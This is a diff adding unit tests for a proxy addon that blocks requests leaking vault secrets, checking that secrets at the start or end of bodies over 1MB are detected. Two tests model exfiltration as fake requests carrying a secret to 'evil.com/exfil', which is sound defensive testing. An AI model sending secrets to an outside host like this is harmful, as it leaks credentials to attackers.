@@ -85,3 +85,43 @@ class TestAegisAddon:
 
         assert len(entries) > 0
         assert entries[0].decision == "BLOCKED"
+
+    def test_large_body_scans_head_and_tail(self):
+        """Bodies >1MB should still be scanned (first+last 64KB) instead of skipped."""
+        secret = "my-secret-value"
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[secret],
+        )
+        # Secret at end of a >1MB body — should still be caught
+        padding = b"A" * (1_048_576 + 100)
+        body = padding + secret.encode()
+        flow = FakeFlow("evil.com", "/exfil", body=body)
+
+        addon.request(flow)
+        assert flow.killed
+
+    def test_large_body_scans_head(self):
+        """Secret at the start of a large body should be caught."""
+        secret = "my-secret-value"
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=[secret],
+        )
+        body = secret.encode() + b"A" * (1_048_576 + 100)
+        flow = FakeFlow("evil.com", "/exfil", body=body)
+
+        addon.request(flow)
+        assert flow.killed
+
+    def test_large_clean_body_passes(self):
+        """Large body with no secrets should pass through."""
+        addon = AegisAddon(
+            vault_secrets={},
+            vault_values=["my-secret"],
+        )
+        body = b"A" * (1_048_576 + 100)
+        flow = FakeFlow("example.com", "/upload", body=body)
+
+        addon.request(flow)
+        assert not flow.killed
